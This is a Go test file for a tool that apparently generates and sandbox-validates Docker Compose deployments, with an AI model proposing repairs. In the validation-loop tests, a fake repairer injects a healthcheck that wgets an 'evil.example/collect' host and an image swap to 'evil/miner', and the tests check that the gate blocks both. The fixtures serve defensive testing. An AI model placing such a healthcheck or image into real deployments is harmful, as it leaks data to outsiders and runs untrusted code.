package pipeline

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/aiulian25/composewright/internal/config"
	"github.com/aiulian25/composewright/internal/extract"
	"github.com/aiulian25/composewright/internal/fetch"
	"github.com/aiulian25/composewright/internal/ir"
	"github.com/aiulian25/composewright/internal/llm"
	"github.com/aiulian25/composewright/internal/policy"
	"github.com/aiulian25/composewright/internal/rules"
	"github.com/aiulian25/composewright/internal/sandbox"
	"github.com/aiulian25/composewright/internal/store"
	"github.com/aiulian25/composewright/internal/workspace"
)

const (
	minifluxFiles = "../../testdata/corpus/miniflux/files"
	healthy       = `{"Service":"miniflux","State":"running","Health":"healthy"}` + "\n" + `{"Service":"db","State":"running","Health":"healthy"}`
	unhealthy     = `{"Service":"miniflux","State":"running","Health":"unhealthy"}` + "\n" + `{"Service":"db","State":"running","Health":"healthy"}`
)

// probeRun and probeAnswer are how the sandbox runs its reachability probe
// and what a healthy app answers it.
const (
	probeRun    = " run --rm "
	probeAnswer = "  HTTP/1.1 200 OK\n"
)

// scriptedDocker answers `ps` with the next scripted state per run.
type scriptedDocker struct {
	mutex  sync.Mutex
	states []string
	logs   string
	stats  string
	runs   int
	// running answers docker ps for the running containers.
	running string
}

func (docker *scriptedDocker) run(_ context.Context, _ string, _ io.Writer, arguments ...string) ([]byte, []byte, error) {
	docker.mutex.Lock()
	defer docker.mutex.Unlock()
	command := strings.Join(arguments, " ")
	switch {
	case strings.Contains(command, "version --short"):
		return []byte("5.6.0"), nil, nil
	case strings.Contains(command, " up "):
		docker.runs++
		if strings.Contains(docker.states[min(docker.runs, len(docker.states))-1], "unhealthy") {
			return []byte("container miniflux is unhealthy"), nil, errors.New("exit status 1")
		}
	case strings.HasPrefix(command, "stats "):
		return []byte(docker.stats), nil, nil
	case strings.Contains(command, " ps "):
		return []byte(docker.states[min(docker.runs, len(docker.states))-1]), nil, nil
	case strings.Contains(command, " logs "):
		return []byte(docker.logs), nil, nil
	case strings.HasPrefix(command, "info"):
		return []byte(`{"CgroupVersion":"2","CgroupDriver":"systemd"}`), nil, nil
	case strings.Contains(command, probeRun):
		return []byte(probeAnswer), nil, nil
	case strings.HasPrefix(command, "ps --format"):
		return []byte(docker.running), nil, nil
	}
	return nil, nil, nil
}

type fakeRepairer struct {
	calls  int
	mutate func(*ir.IR)
	err    error
	// verdict is the last one it was asked to repair.
	verdict sandbox.Verdict
}

// Repair proposes the plan with one more healthcheck retry unless the case
// says otherwise.
func (repairer *fakeRepairer) Repair(_ context.Context, plan *ir.IR, verdict sandbox.Verdict) (*ir.IR, llm.Call, error) {
	repairer.calls++
	repairer.verdict = verdict
	if repairer.err != nil {
		return nil, llm.Call{}, repairer.err
	}
	repaired := plan.Clone()
	repaired.Services[0].Healthcheck.Retries++
	if repairer.mutate != nil {
		repairer.mutate(repaired)
	}
	return repaired, llm.Call{Provider: "fake", Model: repairModel, PromptHash: repairPromptHash}, nil
}

// TestAnotherSourceCannotTakeOverAProject: a second repository whose plan
// derives an existing project's name is refused, so it never inherits that
// project's stored secrets; the same source still regenerates, and a name
// given on purpose moves the project to the new source with a notice.
func TestAnotherSourceCannotTakeOverAProject(t *testing.T) {
	ctx := context.Background()
	dependencies := testDependencies(t, &scriptedDocker{})
	first := generated(t, dependencies)
	fork := testOptions()
	fork.RunSandbox, fork.Upstream = false, "https://github.com/someone/v2"
	if _, err := Generate(ctx, dependencies, fork); !errors.Is(err, ErrNameTaken) {
		t.Fatalf("another source took over %s: %v", first.Plan.App.Name, err)
	}
	again := testOptions()
	again.RunSandbox = false
	if _, err := Generate(ctx, dependencies, again); err != nil {
		t.Fatalf("the same source cannot regenerate: %v", err)
	}
	fork.Name = first.Plan.App.Name
	moved, err := Generate(ctx, dependencies, fork)
	if err != nil {
		t.Fatalf("a name given on purpose was refused: %v", err)
	}
	if !slices.ContainsFunc(moved.Notices, func(notice string) bool {
		return strings.Contains(notice, "now comes from https://github.com/someone/v2")
	}) {
		t.Fatalf("the move to another source was silent: %v", moved.Notices)
	}
}

// TestStoredVersionIsGatedAgain: a version stored while its images were
// allowed is refused once today's allowlist blocks it, both when approved and
// when run again, and the refusal names the finding, which the stored report
// does not show.
func TestStoredVersionIsGatedAgain(t *testing.T) {
	ctx := context.Background()
	dependencies := testDependencies(t, &scriptedDocker{states: []string{healthy}})
	// The source's owner is not miniflux, so only this entry admits its image.
	const minifluxImages = "docker.io/miniflux/*"
	allowed := dependencies.Config.Registries.Allow
	dependencies.Config.Registries.Allow = append(slices.Clone(allowed), minifluxImages)
	options := testOptions()
	options.RunSandbox, options.Upstream = false, "https://github.com/someone/v2"
	if _, err := Generate(ctx, dependencies, options); err != nil {
		t.Fatal(err)
	}
	if stored, err := Load(ctx, dependencies.Workspace, "miniflux"); err != nil || stored.Report.Blocked() {
		t.Fatalf("the stored version should pass the gate it was made under: %v", err)
	}
	dependencies.Config.Registries.Allow = allowed
	if _, err := ApproveAndValidate(ctx, dependencies, "miniflux", "test"); !errors.Is(err, ErrBlocked) || !strings.Contains(err.Error(), "P1 ") {
		t.Fatalf("approved under an allowlist that blocks it: %v", err)
	}
	if _, _, err := Revalidate(ctx, dependencies, "miniflux"); !errors.Is(err, ErrBlocked) {
		t.Fatalf("run again under an allowlist that blocks it: %v", err)
	}
}

func testDependencies(t *testing.T, docker *scriptedDocker) Dependencies {
	t.Helper()
	root := t.TempDir()
	loaded := &config.Loaded{Config: config.Default(), Paths: config.Paths{ConfigFile: filepath.Join(root, "config.yaml"),
		DataDir: filepath.Join(root, "data"), KeyFile: filepath.Join(root, "data", "keys", "master.key")}}
	if _, err := workspace.Init(context.Background(), loaded); err != nil {
		t.Fatal(err)
	}
	opened, err := workspace.Open(context.Background(), loaded)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { opened.Close() })
	limits, _ := sandbox.ParseLimits("1g", 1, 128)
	return Dependencies{Config: loaded.Config, Workspace: opened, Version: "test",
		Sandbox: sandbox.New(docker.run, limits, 30*time.Second, "policy", loaded.Paths.ProjectsDir()),
		Approve: func(*Result) (bool, error) { return true, nil }}
}

func testOptions() Options {
	return Options{Source: minifluxFiles, Upstream: "https://github.com/miniflux/v2", RunSandbox: true, MaxIterations: 3}
}

func status(t *testing.T, dependencies Dependencies) string {
	t.Helper()
	project, err := dependencies.Workspace.Store.FindProject(context.Background(), "miniflux")
	if err != nil {
		t.Fatal(err)
	}
	return project.Status
}

func TestValidationLoop(t *testing.T) {
	cases := []struct {
		name       string
		states     []string
		repairer   *fakeRepairer
		approve    bool
		verdicts   int
		repairs    int
		wantStatus string
	}{
		{name: "pass first time", states: []string{healthy}, approve: true, verdicts: 1, wantStatus: store.StatusPassed},
		{name: "fail without a repairer", states: []string{unhealthy}, approve: true, verdicts: 1, wantStatus: store.StatusNeedsHuman},
		{name: "repair then pass", states: []string{unhealthy, healthy}, repairer: &fakeRepairer{}, approve: true, verdicts: 2, repairs: 1, wantStatus: store.StatusPassed},
		{name: "give up after max iterations", states: []string{unhealthy}, repairer: &fakeRepairer{}, approve: true, verdicts: 3, repairs: 2, wantStatus: store.StatusNeedsHuman},
		{name: "repair blocked by the gate", states: []string{unhealthy}, approve: true, verdicts: 1, repairs: 1, wantStatus: store.StatusNeedsHuman,
			repairer: &fakeRepairer{mutate: func(plan *ir.IR) {
				plan.Services[0].Healthcheck.Test = []string{ir.HealthcheckCommand, "wget", "-qO-", "http://evil.example/collect"}
			}}},
		{name: "image swap is not a repair", states: []string{unhealthy}, approve: true, verdicts: 1, repairs: 1, wantStatus: store.StatusNeedsHuman,
			repairer: &fakeRepairer{mutate: func(plan *ir.IR) {
				plan.Services[0].Healthcheck.Retries--
				plan.Services[0].Image.Repository = "evil/miner"
			}}},
		{name: "repair error", states: []string{unhealthy}, repairer: &fakeRepairer{err: errors.New("model unavailable")}, approve: true, verdicts: 1, repairs: 1, wantStatus: store.StatusNeedsHuman},
		{name: "not approved", states: []string{healthy}, approve: false, verdicts: 0, wantStatus: store.StatusGenerated},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			docker := &scriptedDocker{states: testCase.states}
			dependencies := testDependencies(t, docker)
			dependencies.Approve = func(*Result) (bool, error) { return testCase.approve, nil }
			if testCase.repairer != nil {
				dependencies.Repairer = testCase.repairer
			}
			result, err := Generate(context.Background(), dependencies, testOptions())
			if err != nil {
				t.Fatal(err)
			}
			if len(result.Verdicts) != testCase.verdicts || docker.runs != testCase.verdicts {
				t.Fatalf("verdicts %d, sandbox runs %d, want %d", len(result.Verdicts), docker.runs, testCase.verdicts)
			}
			if testCase.repairer != nil && testCase.repairer.calls != testCase.repairs {
				t.Fatalf("repairs %d, want %d", testCase.repairer.calls, testCase.repairs)
			}
			if got := status(t, dependencies); got != testCase.wantStatus {
				t.Fatalf("status %s, want %s (notices %v)", got, testCase.wantStatus, result.Notices)
			}
			count, err := dependencies.Workspace.Store.VerifyAudit(context.Background())
			if err != nil || count == 0 {
				t.Fatalf("audit chain: %d %v", count, err)
			}
		})
	}
}

// TestOptionalServicesSwitchOnAndOff: a model never sees an optional service
// that is off, drafting or filling; a generation with it switched on adds
// it and keeps what a person set, added and typed in on the Review; a name
// matches in any case and is stored as the plan spells it; switching it off
// keeps its generated password for when it is switched on again; and a
// regeneration that names none keeps the choice.
func TestOptionalServicesSwitchOnAndOff(t *testing.T) {
	ctx := context.Background()
	directory := t.TempDir()
	const cacheImage = "docker.io/library/redis:7"
	compose := "services:\n  app:\n    image: docker.io/library/nginx:1.27\n    ports: [\"8080:80\"]\n    environment:\n" +
		"      SMTP_PASSWORD: ${SMTP_PASSWORD}\n      LOG_LEVEL: ${LOG_LEVEL:-info}\n" +
		"  cache:\n    image: " + cacheImage + "\n    profiles: [cache]\n    environment:\n      REDIS_PASSWORD: ${REDIS_PASSWORD}\n"
	if err := os.WriteFile(filepath.Join(directory, "compose.yaml"), []byte(compose), 0o600); err != nil {
		t.Fatal(err)
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	model := &scriptedModel{change: func(*ir.IR) {}}
	dependencies.Assistant = llm.NewAssistant(model, "configured", 60000)
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", Engine: EngineModel}); err != nil {
		t.Fatal(err)
	}
	result, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", Engine: EngineAssisted})
	if err != nil {
		t.Fatal(err)
	}
	seen := slices.ContainsFunc(model.prompts, func(prompt string) bool { return strings.Contains(prompt, cacheImage) })
	if seen || len(model.prompts) != 2 || result.Engine != EngineAssisted || len(result.Plan.OptionalServices) != 1 {
		t.Fatalf("engine %s, the model saw the switched-off service: %t, optional %+v", result.Engine, seen, result.Plan.OptionalServices)
	}
	decided := Revision{Values: map[string]string{"LOG_LEVEL": "debug"}, Add: []Variable{{Key: "EXTRA_SETTING", Value: "on"}},
		Secrets: map[string]string{"SMTP_PASSWORD": "typed-in-secret"}}
	if _, err := Revise(ctx, dependencies, "talk", decided); err != nil {
		t.Fatal(err)
	}
	switchTo := func(enabled []string) *Stored {
		t.Helper()
		if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", EnabledOptional: enabled}); err != nil {
			t.Fatal(err)
		}
		stored := load(t, dependencies, "talk")
		app := stored.Plan.AppService()
		added := slices.ContainsFunc(app.Env, func(variable ir.EnvRef) bool { return variable.Ref == "EXTRA_SETTING" })
		if stored.Values["LOG_LEVEL"] != "debug" || stored.Values["EXTRA_SETTING"] != "on" || !added || stored.Values["SMTP_PASSWORD"] != "typed-in-secret" {
			t.Fatalf("with %v what the person set, added or typed in was lost: %+v", enabled, stored.Values)
		}
		return stored
	}
	on := switchTo([]string{"CACHE"})
	password := on.Values["REDIS_PASSWORD"]
	if _, found := on.Plan.Service("cache"); !found || !slices.Equal(on.Options.EnabledOptional, []string{"cache"}) || password == "" {
		t.Fatalf("switched on %v, password %t", on.Options.EnabledOptional, password != "")
	}
	off := switchTo([]string{})
	if _, found := off.Plan.Service("cache"); found {
		t.Fatalf("switched off: services %+v", off.Plan.Services)
	}
	if _, found := off.Plan.EnvEntry("REDIS_PASSWORD"); found {
		t.Fatalf("the switched-off service left its variable: %+v", off.Plan.EnvFile)
	}
	if again := switchTo([]string{"cache"}); again.Values["REDIS_PASSWORD"] != password {
		t.Fatal("switching the service off and on again made a new password")
	}
	if kept := switchTo(nil); !slices.Equal(kept.Options.EnabledOptional, []string{"cache"}) {
		t.Fatalf("a regeneration lost the choice: %v", kept.Options.EnabledOptional)
	}
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", EnabledOptional: []string{"gpu"}}); !errors.Is(err, rules.ErrNotOptional) {
		t.Fatalf("an optional service the plan does not offer: %v", err)
	}
}

// TestRegenerationReadsTheSameFiles: a project generates again with the
// options of its latest version and a GitHub repository at the stored
// commit; files someone uploaded cannot be read again.
func TestRegenerationReadsTheSameFiles(t *testing.T) {
	const commit = "0123456789abcdef0123456789abcdef01234567"
	kept := Options{Engine: EngineAssisted, Source: "https://github.com/acme/notes", Ref: "main", ExposeVia: "lan", Networks: []string{"proxy"},
		Storage: "bind", AllowNeeds: []string{ir.NeedDevices}, AllowRegistries: []string{"ghcr.io/acme/*"}, BenignLogPatterns: []string{"warn"},
		ProfileFile: "profile.yaml", Upstream: "https://github.com/acme/notes", Owner: "acme", RunSandbox: true, Edited: true,
		ComposeFile: "contrib/compose.yaml"}
	stored := &Stored{Project: store.Project{Name: "notes", SourceKind: fetch.SourceGitHub, SourceCommit: commit}, Options: kept}
	options, err := stored.Regeneration([]string{"tts"}, "")
	if err != nil {
		t.Fatal(err)
	}
	want := kept
	want.Name, want.Ref, want.EnabledOptional, want.RunSandbox, want.Edited = "notes", commit, []string{"tts"}, false, false
	want.Regenerating = true
	if !reflect.DeepEqual(options, want) {
		t.Fatalf("got %+v\nwant %+v", options, want)
	}
	if options, err := stored.Regeneration(nil, "contrib/compose.traefik.yaml"); err != nil || options.ComposeFile != "contrib/compose.traefik.yaml" {
		t.Fatalf("another compose file: %q, %v", options.ComposeFile, err)
	}
	stored.Options.Uploaded = true
	if _, err := stored.Regeneration(nil, ""); !errors.Is(err, ErrNotRereadable) {
		t.Fatalf("an upload: %v", err)
	}
}

// TestComposeVariantSwitch: generating a project again from another compose
// file builds it from that file, keeps a value and a secret a person set for
// keys both files have, and keeps on only the optional services the new file
// offers, with a notice for the others; a later regeneration, or a gen that
// names none, stays on that file, and a file the repository lacks is noted
// and the one built from instead kept. A path spelt with ./ names the same file. The model sees
// nothing of the file not chosen but the image both share, and keeps the
// note of one that is missing; what its provenance cites never marks the
// file built from.
func TestComposeVariantSwitch(t *testing.T) {
	ctx := context.Background()
	directory := t.TempDir()
	const variant = "contrib/compose.traefik.yaml"
	const sharedImage = "docker.io/library/nginx:1.27"
	app := "services:\n  app:\n    image: " + sharedImage + "\n    ports: [\"8080:80\"]\n    environment:\n" +
		"      LOG_LEVEL: ${LOG_LEVEL:-info}\n      SMTP_PASSWORD: ${SMTP_PASSWORD}\n"
	const plainOnly = "PLAIN_ONLY"
	files := map[string]string{"compose.yaml": app + "      " + plainOnly + ": ${" + plainOnly + "}\n  tts:\n    image: docker.io/library/busybox:1.36\n    profiles: [tts]\n",
		variant: app + "  proxy:\n    image: docker.io/library/traefik:v3.1\n"}
	for name, content := range files {
		if err := os.MkdirAll(filepath.Dir(filepath.Join(directory, name)), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(directory, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", EnabledOptional: []string{"tts"}}); err != nil {
		t.Fatal(err)
	}
	if _, err := Revise(ctx, dependencies, "talk", Revision{Values: map[string]string{"LOG_LEVEL": "debug"}, Secrets: map[string]string{"SMTP_PASSWORD": "typed-in-secret"}}); err != nil {
		t.Fatal(err)
	}
	regenerate := func(composeFile string) (*Result, *Stored) {
		t.Helper()
		options, err := load(t, dependencies, "talk").Regeneration([]string{"tts"}, composeFile)
		if err != nil {
			t.Fatal(err)
		}
		result, err := Generate(ctx, dependencies, options)
		if err != nil {
			t.Fatal(err)
		}
		return result, load(t, dependencies, "talk")
	}
	result, switched := regenerate(variant)
	for _, service := range switched.Plan.Services {
		if !strings.HasPrefix(service.Provenance.SourceRef, variant+":") {
			t.Fatalf("%s comes from %s", service.Name, service.Provenance.SourceRef)
		}
	}
	if switched.Options.ComposeFile != variant || len(switched.Options.EnabledOptional) != 0 || !slices.Contains(result.Notices, keptChoiceNotice+rules.ErrNotOptional.Error()+": tts") {
		t.Fatalf("options %+v, notices %q", switched.Options, result.Notices)
	}
	if !slices.ContainsFunc(result.Facts.FromCompose(variant).Images, func(mention extract.ImageMention) bool { return mention.Reference == sharedImage }) {
		t.Fatalf("the image both files share was left out of the facts")
	}
	if switched.Values["LOG_LEVEL"] != "debug" || switched.Values["SMTP_PASSWORD"] != "typed-in-secret" {
		t.Fatalf("what the person set was lost: %+v", switched.Values)
	}
	if _, again := regenerate(""); again.Options.ComposeFile != variant {
		t.Fatalf("a regeneration left the chosen file: %q", again.Options.ComposeFile)
	}
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk"}); err != nil || load(t, dependencies, "talk").Options.ComposeFile != variant {
		t.Fatalf("a gen naming no file left the chosen one: %v", err)
	}
	const missingNote = "compose variant gone.yaml not found; used compose.yaml"
	missingResult, missing := regenerate("gone.yaml")
	if missing.Options.ComposeFile != "compose.yaml" || !slices.Contains(missing.Plan.PostInstallNotes, missingNote) || !slices.Contains(missingResult.Notices, missingNote) {
		t.Fatalf("a missing file: %q, notes %q, notices %q", missing.Options.ComposeFile, missing.Plan.PostInstallNotes, missingResult.Notices)
	}
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", ComposeFile: "./" + variant}); err != nil || load(t, dependencies, "talk").Options.ComposeFile != variant {
		t.Fatalf("a path spelt with ./ was not found: %v", err)
	}
	model := &scriptedModel{change: func(*ir.IR) {}}
	dependencies.Assistant = llm.NewAssistant(model, "configured", 60000)
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "voice", Engine: EngineModel, ComposeFile: variant}); err != nil {
		t.Fatal(err)
	}
	if len(model.prompts) != 1 || strings.Contains(model.prompts[0], plainOnly) {
		t.Fatalf("the model saw the file not chosen: %d prompts", len(model.prompts))
	}
	drafted, err := Generate(ctx, dependencies, Options{Source: directory, Name: "voice", Engine: EngineModel, ComposeFile: "gone.yaml"})
	if err != nil || drafted.Engine != EngineModel || !slices.Contains(drafted.Plan.PostInstallNotes, missingNote) {
		t.Fatalf("the model's plan lost the note: %v, notes %q", err, drafted.Plan.PostInstallNotes)
	}
	model.change = func(plan *ir.IR) {
		for index := range plan.Services {
			plan.Services[index].Provenance.SourceRef = variant + ":1"
		}
	}
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "chat", Engine: EngineModel}); err != nil || load(t, dependencies, "chat").BuiltFrom() != "compose.yaml" {
		t.Fatalf("the model's provenance chose the file built from: %v", err)
	}
}

// TestSwitchedOffServiceSurvivesEdits: while an optional service is off, a
// compose edit on the Review and a save in the editor keep its generated
// password and the value a person set for it, as the editor never showed
// them; switching it on again gets both back.
func TestSwitchedOffServiceSurvivesEdits(t *testing.T) {
	ctx := context.Background()
	directory := t.TempDir()
	compose := "services:\n  app:\n    image: docker.io/library/nginx:1.27\n    ports: [\"8080:80\"]\n" +
		"  cache:\n    image: docker.io/library/redis:7\n    profiles: [cache]\n    environment:\n" +
		"      REDIS_PASSWORD: ${REDIS_PASSWORD}\n      CACHE_MODE: ${CACHE_MODE:-lru}\n"
	if err := os.WriteFile(filepath.Join(directory, "compose.yaml"), []byte(compose), 0o600); err != nil {
		t.Fatal(err)
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	generate := func(enabled []string) *Stored {
		t.Helper()
		if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "talk", EnabledOptional: enabled}); err != nil {
			t.Fatal(err)
		}
		return load(t, dependencies, "talk")
	}
	password := generate([]string{"cache"}).Values["REDIS_PASSWORD"]
	if _, err := Revise(ctx, dependencies, "talk", Revision{Values: map[string]string{"CACHE_MODE": "lfu"}}); err != nil {
		t.Fatal(err)
	}
	off := generate([]string{})
	if _, err := EditCompose(ctx, dependencies, "talk", []byte(off.Generation.ComposeYAML)); err != nil {
		t.Fatal(err)
	}
	edited := load(t, dependencies, "talk")
	env, err := edited.EnvFile(Revealed)
	if err != nil {
		t.Fatal(err)
	}
	if _, check, err := SaveEdit(ctx, dependencies, "talk", Edit{Compose: []byte(edited.Generation.ComposeYAML), Env: string(env) + "OTHER_SETTING=x\n"}); err != nil {
		t.Fatalf("%v: %+v", err, check.Problems)
	}
	again := generate([]string{"cache"})
	if password == "" || again.Values["REDIS_PASSWORD"] != password || again.Values["CACHE_MODE"] != "lfu" {
		t.Fatalf("an edit while the service was off lost what it had: password kept %t, CACHE_MODE %q",
			again.Values["REDIS_PASSWORD"] == password, again.Values["CACHE_MODE"])
	}
}

// TestRegenerationKeepsItsSource: a folder given by a relative path is
// stored as an absolute one, so generating again from another working
// directory reads the same files; a regeneration that reads another folder
// is refused rather than moving the project there.
func TestRegenerationKeepsItsSource(t *testing.T) {
	ctx := context.Background()
	write := func(root, image string) {
		t.Helper()
		folder := filepath.Join(root, "app")
		if err := os.MkdirAll(folder, 0o700); err != nil {
			t.Fatal(err)
		}
		compose := "services:\n  app:\n    image: " + image + "\n    ports: [\"8080:80\"]\n"
		if err := os.WriteFile(filepath.Join(folder, "compose.yaml"), []byte(compose), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	first, second := t.TempDir(), t.TempDir()
	write(first, "docker.io/library/nginx:1.27")
	write(second, "docker.io/library/httpd:2.4")
	dependencies := testDependencies(t, &scriptedDocker{})
	t.Chdir(first)
	if _, err := Generate(ctx, dependencies, Options{Source: "./app"}); err != nil {
		t.Fatal(err)
	}
	t.Chdir(second)
	stored := load(t, dependencies, "app")
	options, err := stored.Regeneration(nil, "")
	if err != nil {
		t.Fatal(err)
	}
	result, err := Generate(ctx, dependencies, options)
	if err != nil {
		t.Fatal(err)
	}
	if options.Source != filepath.Join(first, "app") || result.Plan.AppService().Image.Repository != "library/nginx" {
		t.Fatalf("the regeneration read %s: %+v", options.Source, result.Plan.AppService().Image)
	}
	options.Source = "./app"
	if _, err := Generate(ctx, dependencies, options); !errors.Is(err, ErrSourceMoved) {
		t.Fatalf("a regeneration from another folder: %v", err)
	}
}

// TestModelLeavingOutASwitchedOnService: a model's whole plan that lacks an
// optional service switched on says so.
func TestModelLeavingOutASwitchedOnService(t *testing.T) {
	directory := t.TempDir()
	compose := "services:\n  app:\n    image: docker.io/library/nginx:1.27\n    ports: [\"8080:80\"]\n" +
		"  cache:\n    image: docker.io/library/redis:7\n    profiles: [cache]\n"
	if err := os.WriteFile(filepath.Join(directory, "compose.yaml"), []byte(compose), 0o600); err != nil {
		t.Fatal(err)
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	dependencies.Assistant = llm.NewAssistant(&scriptedModel{change: func(*ir.IR) {}}, "configured", 60000)
	result, err := Generate(context.Background(), dependencies, Options{Source: directory, Name: "notes", Engine: EngineModel,
		EnabledOptional: []string{"cache"}, StopAfter: StageIR})
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(result.Notices, modelLeftOut+"cache") {
		t.Fatalf("no notice for the service the model left out: %v", result.Notices)
	}
}

// TestEditorSaveDropsASecret: a secret removed in the editor stays gone
// from the store; only other versions keep a secret the plan no longer has.
func TestEditorSaveDropsASecret(t *testing.T) {
	ctx := context.Background()
	directory := t.TempDir()
	compose := "services:\n  app:\n    image: docker.io/library/nginx:1.27\n    ports: [\"8080:80\"]\n    environment:\n      SECRET_KEY: ${SECRET_KEY}\n"
	if err := os.WriteFile(filepath.Join(directory, "compose.yaml"), []byte(compose), 0o600); err != nil {
		t.Fatal(err)
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "notes"}); err != nil {
		t.Fatal(err)
	}
	stored := load(t, dependencies, "notes")
	env, err := stored.EnvFile(Revealed)
	if err != nil || stored.Values["SECRET_KEY"] == "" {
		t.Fatalf("no generated key: %v", err)
	}
	var kept []string
	for _, line := range strings.Split(string(env), "\n") {
		if !strings.HasPrefix(line, "SECRET_KEY=") {
			kept = append(kept, line)
		}
	}
	edit := Edit{Compose: []byte(strings.ReplaceAll(stored.Generation.ComposeYAML, "SECRET_KEY", "OTHER_SETTING")), Env: strings.Join(append(kept, "OTHER_SETTING=x"), "\n")}
	if _, check, err := SaveEdit(ctx, dependencies, "notes", edit); err != nil {
		t.Fatalf("%v: %+v", err, check.Problems)
	}
	if _, found := load(t, dependencies, "notes").Values["SECRET_KEY"]; found {
		t.Fatal("the secret removed in the editor is still stored")
	}
}

// TestSwitchingOnKeepsTheDeployedPassword: an optional service listed first
// that upstream gave the database's password reads the database's stored
// password once switched on; the database stays its owner.
func TestSwitchingOnKeepsTheDeployedPassword(t *testing.T) {
	ctx := context.Background()
	directory := t.TempDir()
	const password = "Xk9pLm2qRt7v"
	compose := "services:\n  backup:\n    image: docker.io/library/busybox:1.36\n    profiles: [backup]\n    environment:\n      BACKUP_DB_PASSWORD: " + password + "\n" +
		"  db:\n    image: docker.io/library/postgres:16\n    environment:\n      POSTGRES_PASSWORD: " + password + "\n" +
		"  app:\n    image: docker.io/library/nginx:1.27\n    ports: [\"8080:80\"]\n    environment:\n      DB_PASSWORD: " + password + "\n"
	if err := os.WriteFile(filepath.Join(directory, "compose.yaml"), []byte(compose), 0o600); err != nil {
		t.Fatal(err)
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "notes"}); err != nil {
		t.Fatal(err)
	}
	deployed := load(t, dependencies, "notes").Values["POSTGRES_PASSWORD"]
	if _, err := Generate(ctx, dependencies, Options{Source: directory, Name: "notes", EnabledOptional: []string{"backup"}}); err != nil {
		t.Fatal(err)
	}
	stored := load(t, dependencies, "notes")
	backup, _ := stored.Plan.EnvEntry("BACKUP_DB_PASSWORD")
	if deployed == "" || stored.Values["POSTGRES_PASSWORD"] != deployed || backup == nil || backup.Value != "${POSTGRES_PASSWORD}" {
		t.Fatalf("the deployed password changed hands: %+v", stored.Plan.EnvFile)
	}
}

// TestModelDraftDropsOffDependencies: a model may copy the app's depends_on
// onto a plan whose dependency is an optional service that is off; it is
// dropped as the rules drop it.
func TestModelDraftDropsOffDependencies(t *testing.T) {
	ctx := context.Background()
	directory := t.TempDir()
	compose := "services:\n  app:\n    image: docker.io/library/nginx:1.27\n    ports: [\"8080:80\"]\n    depends_on: [cache]\n" +
		"  cache:\n    image: docker.io/library/redis:7\n    profiles: [cache]\n"
	if err := os.WriteFile(filepath.Join(directory, "compose.yaml"), []byte(compose), 0o600); err != nil {
		t.Fatal(err)
	}
	dependencies := testDependencies(t, &scriptedDocker{})
	waitsForCache := func(plan *ir.IR) {
		plan.Services[0].DependsOn = append(plan.Services[0].DependsOn, ir.Dependency{Service: "cache", Condition: "service_started"})
	}
	dependencies.Assistant = llm.NewAssistant(&scriptedModel{change: waitsForCache}, "configured", 60000)
	result, err := Generate(ctx, dependencies, Options{Source: directory, Name: "notes", Engine: EngineModel, StopAfter: StageIR})
	if err != nil {
		t.Fatal(err)
	}
	drafted := result.Plan.Services[0]
	if result.Engine != EngineModel || slices.ContainsFunc(drafted.DependsOn, func(dependency ir.Dependency) bool { return dependency.Service == "cache" }) {
		t.Fatalf("engine %s, the drafted service still waits for the switched-off cache: %+v", result.Engine, drafted.DependsOn)
	}
}

func load(t *testing.T, dependencies Dependencies, name string) *Stored {
	t.Helper()
	stored, err := Load(context.Background(), dependencies.Workspace, name)
	if err != nil {
		t.Fatal(err)
	}
	return stored
}

func TestRevalidateRecordsTheVerdict(t *testing.T) {
	docker := &scriptedDocker{states: []string{healthy}}
	dependencies := testDependencies(t, docker)
	options := testOptions()
	options.RunSandbox = false
	if _, err := Generate(context.Background(), dependencies, options); err != nil {
		t.Fatal(err)
	}
	stored, verdict, err := Revalidate(context.Background(), dependencies, "miniflux")
	if err != nil || !verdict.Passed() {
		t.Fatalf("revalidate: %+v %v", verdict, err)
	}
	reloaded, err := Load(context.Background(), dependencies.Workspace, stored.Project.Name)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(reloaded.Generation.DeployMD, "Validation: PASS") || reloaded.Generation.ValidationJSON == "" || reloaded.Project.Status != store.StatusPassed {
		t.Fatalf("verdict not recorded: status %s, deploy %q", reloaded.Project.Status, reloaded.Generation.DeployMD[:120])
	}
}

// scriptedModel answers every request with a plan derived from the miniflux
// golden plan, or with an error.
type scriptedModel struct {
	requests int
	prompts  []string
	change   func(*ir.IR)
	err      error
}

func (model *scriptedModel) Name() string { return "scripted" }

func (model *scriptedModel) Generate(_ context.Context, request llm.Request) (llm.Response, error) {
	model.requests++
	model.prompts = append(model.prompts, request.System+request.Prompt)
	if model.err != nil {
		return llm.Response{}, model.err
	}
	content, err := os.ReadFile("../../testdata/corpus/miniflux/expected.ir.json")
	if err != nil {
		return llm.Response{}, err
	}
	plan, err := ir.Decode(content)
	if err != nil {
		return llm.Response{}, err
	}
	model.change(plan)
	answer := any(plan)
	fill, _ := ir.FillSchemaJSON()
	if string(request.Schema) == string(fill) {
		answer = fillAnswer(plan)
	}
	encoded, err := json.Marshal(answer)
	return llm.Response{Text: string(encoded), Model: "scripted-1"}, err
